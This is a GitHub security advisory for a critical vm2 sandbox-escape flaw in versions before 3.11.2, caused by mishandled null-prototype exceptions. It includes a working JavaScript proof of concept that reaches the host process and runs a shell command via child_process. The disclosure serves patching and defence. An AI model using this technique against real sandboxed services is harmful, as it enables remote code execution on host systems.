# [C] vm2 has Sandbox Breakout Through Null Proto Exception

## Summary
Severity: Critical
Advisory: GHSA-9vg3-4rfj-wgcm
CVE: CVE-2026-44009
CWE: CWE-668
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-9vg3-4rfj-wgcm
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.2

## Details
### Summary

VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

In `handleException` due to ``// SECURITY (post-GHSA-mpf8 hardening): use `from` (not `ensureThis`)`` exceptions with a null proto will be assumed to come from the other side and being proxied. Therefore, it is possible to get the proxied and unproxied object of a sandbox object with a null proto when thrown and then catched which allows to get the host `Function` object.

### PoC

```js
const {VM} = require("vm2");
const vm = new VM();
console.log(vm.run(`
const o = {__proto__: null};
try {
	throw o;
} catch (e) {
	e.f = Buffer.prototype.inspect
	o.f.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
}
`));
```

### Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-9vg3-4rfj-wgcm
- https://nvd.nist.gov/vuln/detail/CVE-2026-44009
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.2
